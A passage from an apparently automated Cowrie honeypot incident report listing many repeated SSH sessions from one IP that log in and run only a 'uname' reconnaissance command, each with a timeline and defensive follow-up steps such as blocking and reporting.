| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:15:53` | `cowrie.session.connect` |
| `2026-07-28 05:15:54` | `cowrie.client.version` |
| `2026-07-28 05:15:54` | `cowrie.client.kex` |
| `2026-07-28 05:15:55` | `cowrie.login.success` |
| `2026-07-28 05:15:56` | `cowrie.session.params` |
| `2026-07-28 05:15:56` | `cowrie.command.input` |
| `2026-07-28 05:15:57` | `cowrie.log.closed` |
| `2026-07-28 05:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db8ac2a8fcc3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:15 |
| **Last Seen** | 2026-07-28 05:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:15:59` | `cowrie.session.connect` |
| `2026-07-28 05:15:59` | `cowrie.client.version` |
| `2026-07-28 05:15:59` | `cowrie.client.kex` |
| `2026-07-28 05:16:01` | `cowrie.login.success` |
| `2026-07-28 05:16:02` | `cowrie.session.params` |
| `2026-07-28 05:16:02` | `cowrie.command.input` |
| `2026-07-28 05:16:02` | `cowrie.log.closed` |
| `2026-07-28 05:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6e12b787f95

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:16 |
| **Last Seen** | 2026-07-28 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:16:05` | `cowrie.session.connect` |
| `2026-07-28 05:16:05` | `cowrie.client.version` |
| `2026-07-28 05:16:05` | `cowrie.client.kex` |
| `2026-07-28 05:16:05` | `cowrie.login.success` |
| `2026-07-28 05:16:06` | `cowrie.session.params` |
| `2026-07-28 05:16:06` | `cowrie.command.input` |
| `2026-07-28 05:16:06` | `cowrie.log.closed` |
| `2026-07-28 05:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b648a7b05668

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:16 |
| **Last Seen** | 2026-07-28 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:16:10` | `cowrie.session.connect` |
| `2026-07-28 05:16:11` | `cowrie.client.version` |
| `2026-07-28 05:16:11` | `cowrie.client.kex` |
| `2026-07-28 05:16:11` | `cowrie.login.success` |
| `2026-07-28 05:16:12` | `cowrie.session.params` |
| `2026-07-28 05:16:12` | `cowrie.command.input` |
| `2026-07-28 05:16:12` | `cowrie.log.closed` |
| `2026-07-28 05:16:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e70c2a92b454

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:16 |
| **Last Seen** | 2026-07-28 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:16:16` | `cowrie.session.connect` |
| `2026-07-28 05:16:16` | `cowrie.client.version` |
| `2026-07-28 05:16:17` | `cowrie.client.kex` |
| `2026-07-28 05:16:17` | `cowrie.login.success` |
| `2026-07-28 05:16:18` | `cowrie.session.params` |
| `2026-07-28 05:16:18` | `cowrie.command.input` |
| `2026-07-28 05:16:18` | `cowrie.log.closed` |
| `2026-07-28 05:16:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3620549abb0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:16 |
| **Last Seen** | 2026-07-28 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:16:23` | `cowrie.session.connect` |
| `2026-07-28 05:16:23` | `cowrie.client.version` |
| `2026-07-28 05:16:23` | `cowrie.client.kex` |
| `2026-07-28 05:16:24` | `cowrie.login.success` |
| `2026-07-28 05:16:25` | `cowrie.session.params` |
| `2026-07-28 05:16:25` | `cowrie.command.input` |
| `2026-07-28 05:16:25` | `cowrie.log.closed` |
| `2026-07-28 05:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ed572cc51c7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:16 |
| **Last Seen** | 2026-07-28 05:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:16:29` | `cowrie.session.connect` |
| `2026-07-28 05:16:29` | `cowrie.client.version` |
| `2026-07-28 05:16:29` | `cowrie.client.kex` |
| `2026-07-28 05:16:30` | `cowrie.login.success` |
| `2026-07-28 05:16:31` | `cowrie.session.params` |
| `2026-07-28 05:16:31` | `cowrie.command.input` |
| `2026-07-28 05:16:31` | `cowrie.log.closed` |
| `2026-07-28 05:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2454b1fbde26

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:16 |
| **Last Seen** | 2026-07-28 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:16:35` | `cowrie.session.connect` |
| `2026-07-28 05:16:35` | `cowrie.client.version` |
| `2026-07-28 05:16:35` | `cowrie.client.kex` |
| `2026-07-28 05:16:36` | `cowrie.login.success` |
| `2026-07-28 05:16:36` | `cowrie.session.params` |
| `2026-07-28 05:16:36` | `cowrie.command.input` |
| `2026-07-28 05:16:37` | `cowrie.log.closed` |
| `2026-07-28 05:16:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c855e35400ca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:16 |
| **Last Seen** | 2026-07-28 05:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:16:40` | `cowrie.session.connect` |
| `2026-07-28 05:16:41` | `cowrie.client.version` |
| `2026-07-28 05:16:41` | `cowrie.client.kex` |
| `2026-07-28 05:16:43` | `cowrie.login.success` |
| `2026-07-28 05:16:44` | `cowrie.session.params` |
| `2026-07-28 05:16:44` | `cowrie.command.input` |
| `2026-07-28 05:16:45` | `cowrie.log.closed` |
| `2026-07-28 05:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2bf26e4865d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:16 |
| **Last Seen** | 2026-07-28 05:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:16:47` | `cowrie.session.connect` |
| `2026-07-28 05:16:47` | `cowrie.client.version` |
| `2026-07-28 05:16:47` | `cowrie.client.kex` |
| `2026-07-28 05:16:48` | `cowrie.login.success` |
| `2026-07-28 05:16:49` | `cowrie.session.params` |
| `2026-07-28 05:16:49` | `cowrie.command.input` |
| `2026-07-28 05:16:50` | `cowrie.log.closed` |
| `2026-07-28 05:16:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f9a25e17929

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:16 |
| **Last Seen** | 2026-07-28 05:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:16:53` | `cowrie.session.connect` |
| `2026-07-28 05:16:53` | `cowrie.client.version` |
| `2026-07-28 05:16:53` | `cowrie.client.kex` |
| `2026-07-28 05:16:54` | `cowrie.login.success` |
| `2026-07-28 05:16:55` | `cowrie.session.params` |
| `2026-07-28 05:16:55` | `cowrie.command.input` |
| `2026-07-28 05:16:55` | `cowrie.log.closed` |
| `2026-07-28 05:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10493a197d76

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:16 |
| **Last Seen** | 2026-07-28 05:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:16:59` | `cowrie.session.connect` |
| `2026-07-28 05:16:59` | `cowrie.client.version` |
| `2026-07-28 05:16:59` | `cowrie.client.kex` |
| `2026-07-28 05:17:01` | `cowrie.login.success` |
| `2026-07-28 05:17:02` | `cowrie.session.params` |
| `2026-07-28 05:17:02` | `cowrie.command.input` |
| `2026-07-28 05:17:02` | `cowrie.log.closed` |
| `2026-07-28 05:17:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec40432fc019

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:17 |
| **Last Seen** | 2026-07-28 05:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:17:05` | `cowrie.session.connect` |
| `2026-07-28 05:17:06` | `cowrie.client.version` |
| `2026-07-28 05:17:06` | `cowrie.client.kex` |
| `2026-07-28 05:17:07` | `cowrie.login.success` |
| `2026-07-28 05:17:09` | `cowrie.session.params` |
| `2026-07-28 05:17:09` | `cowrie.command.input` |
| `2026-07-28 05:17:09` | `cowrie.log.closed` |
| `2026-07-28 05:17:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ea159db337c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:17 |
| **Last Seen** | 2026-07-28 05:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:17:11` | `cowrie.session.connect` |
| `2026-07-28 05:17:11` | `cowrie.client.version` |
| `2026-07-28 05:17:11` | `cowrie.client.kex` |
| `2026-07-28 05:17:13` | `cowrie.login.success` |
| `2026-07-28 05:17:15` | `cowrie.session.params` |
| `2026-07-28 05:17:15` | `cowrie.command.input` |
| `2026-07-28 05:17:15` | `cowrie.log.closed` |
| `2026-07-28 05:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-896914cad9b8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:17 |
| **Last Seen** | 2026-07-28 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:17:18` | `cowrie.session.connect` |
| `2026-07-28 05:17:18` | `cowrie.client.version` |
| `2026-07-28 05:17:18` | `cowrie.client.kex` |
| `2026-07-28 05:17:19` | `cowrie.login.success` |
| `2026-07-28 05:17:19` | `cowrie.session.params` |
| `2026-07-28 05:17:19` | `cowrie.command.input` |
| `2026-07-28 05:17:20` | `cowrie.log.closed` |
| `2026-07-28 05:17:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4020b5d7393

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:17 |
| **Last Seen** | 2026-07-28 05:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:17:24` | `cowrie.session.connect` |
| `2026-07-28 05:17:24` | `cowrie.client.version` |
| `2026-07-28 05:17:24` | `cowrie.client.kex` |
| `2026-07-28 05:17:25` | `cowrie.login.success` |
| `2026-07-28 05:17:27` | `cowrie.session.params` |
| `2026-07-28 05:17:27` | `cowrie.command.input` |
| `2026-07-28 05:17:27` | `cowrie.log.closed` |
| `2026-07-28 05:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c54ed7a591de

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:17 |
| **Last Seen** | 2026-07-28 05:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:17:30` | `cowrie.session.connect` |
| `2026-07-28 05:17:30` | `cowrie.client.version` |
| `2026-07-28 05:17:30` | `cowrie.client.kex` |
| `2026-07-28 05:17:31` | `cowrie.login.success` |
| `2026-07-28 05:17:32` | `cowrie.session.params` |
| `2026-07-28 05:17:32` | `cowrie.command.input` |
| `2026-07-28 05:17:32` | `cowrie.log.closed` |
| `2026-07-28 05:17:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4196b5ba37ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:17 |
| **Last Seen** | 2026-07-28 05:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:17:35` | `cowrie.session.connect` |
| `2026-07-28 05:17:35` | `cowrie.client.version` |
| `2026-07-28 05:17:35` | `cowrie.client.kex` |
| `2026-07-28 05:17:38` | `cowrie.login.success` |
| `2026-07-28 05:17:39` | `cowrie.session.params` |
| `2026-07-28 05:17:39` | `cowrie.command.input` |
| `2026-07-28 05:17:40` | `cowrie.log.closed` |
| `2026-07-28 05:17:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59047b934f04

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:17 |
| **Last Seen** | 2026-07-28 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:17:42` | `cowrie.session.connect` |
| `2026-07-28 05:17:42` | `cowrie.client.version` |
| `2026-07-28 05:17:42` | `cowrie.client.kex` |
| `2026-07-28 05:17:43` | `cowrie.login.success` |
| `2026-07-28 05:17:44` | `cowrie.session.params` |
| `2026-07-28 05:17:44` | `cowrie.command.input` |
| `2026-07-28 05:17:44` | `cowrie.log.closed` |
| `2026-07-28 05:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c41e23c46a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:17 |
| **Last Seen** | 2026-07-28 05:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:17:48` | `cowrie.session.connect` |
| `2026-07-28 05:17:48` | `cowrie.client.version` |
| `2026-07-28 05:17:48` | `cowrie.client.kex` |
| `2026-07-28 05:17:49` | `cowrie.login.success` |
| `2026-07-28 05:17:50` | `cowrie.session.params` |
| `2026-07-28 05:17:50` | `cowrie.command.input` |
| `2026-07-28 05:17:50` | `cowrie.log.closed` |
| `2026-07-28 05:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb10e6e043c7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:17 |
| **Last Seen** | 2026-07-28 05:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:17:53` | `cowrie.session.connect` |
| `2026-07-28 05:17:54` | `cowrie.client.version` |
| `2026-07-28 05:17:54` | `cowrie.client.kex` |
| `2026-07-28 05:17:54` | `cowrie.login.success` |
| `2026-07-28 05:17:56` | `cowrie.session.params` |
| `2026-07-28 05:17:56` | `cowrie.command.input` |
| `2026-07-28 05:17:56` | `cowrie.log.closed` |
| `2026-07-28 05:17:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6bfe44d3eae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:17 |
| **Last Seen** | 2026-07-28 05:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:17:59` | `cowrie.session.connect` |
| `2026-07-28 05:17:59` | `cowrie.client.version` |
| `2026-07-28 05:17:59` | `cowrie.client.kex` |
| `2026-07-28 05:18:00` | `cowrie.login.success` |
| `2026-07-28 05:18:00` | `cowrie.session.params` |
| `2026-07-28 05:18:00` | `cowrie.command.input` |
| `2026-07-28 05:18:01` | `cowrie.log.closed` |
| `2026-07-28 05:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20def773261b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:18 |
| **Last Seen** | 2026-07-28 05:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:18:04` | `cowrie.session.connect` |
| `2026-07-28 05:18:04` | `cowrie.client.version` |
| `2026-07-28 05:18:04` | `cowrie.client.kex` |
| `2026-07-28 05:18:05` | `cowrie.login.success` |
| `2026-07-28 05:18:06` | `cowrie.session.params` |
| `2026-07-28 05:18:06` | `cowrie.command.input` |
| `2026-07-28 05:18:07` | `cowrie.log.closed` |
| `2026-07-28 05:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a85a49e2d16

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:18 |
| **Last Seen** | 2026-07-28 05:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:18:10` | `cowrie.session.connect` |
| `2026-07-28 05:18:10` | `cowrie.client.version` |
| `2026-07-28 05:18:10` | `cowrie.client.kex` |
| `2026-07-28 05:18:11` | `cowrie.login.success` |
| `2026-07-28 05:18:12` | `cowrie.session.params` |
| `2026-07-28 05:18:12` | `cowrie.command.input` |
| `2026-07-28 05:18:12` | `cowrie.log.closed` |
| `2026-07-28 05:18:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e81e5caa4b65

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:18 |
| **Last Seen** | 2026-07-28 05:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:18:16` | `cowrie.session.connect` |
| `2026-07-28 05:18:16` | `cowrie.client.version` |
| `2026-07-28 05:18:16` | `cowrie.client.kex` |
| `2026-07-28 05:18:16` | `cowrie.login.success` |
| `2026-07-28 05:18:17` | `cowrie.session.params` |
| `2026-07-28 05:18:17` | `cowrie.command.input` |
| `2026-07-28 05:18:17` | `cowrie.log.closed` |
| `2026-07-28 05:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81cd0b453777

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:18 |
| **Last Seen** | 2026-07-28 05:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:18:22` | `cowrie.session.connect` |
| `2026-07-28 05:18:22` | `cowrie.client.version` |
| `2026-07-28 05:18:22` | `cowrie.client.kex` |
| `2026-07-28 05:18:23` | `cowrie.login.success` |
| `2026-07-28 05:18:23` | `cowrie.session.params` |
| `2026-07-28 05:18:23` | `cowrie.command.input` |
| `2026-07-28 05:18:24` | `cowrie.log.closed` |
| `2026-07-28 05:18:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
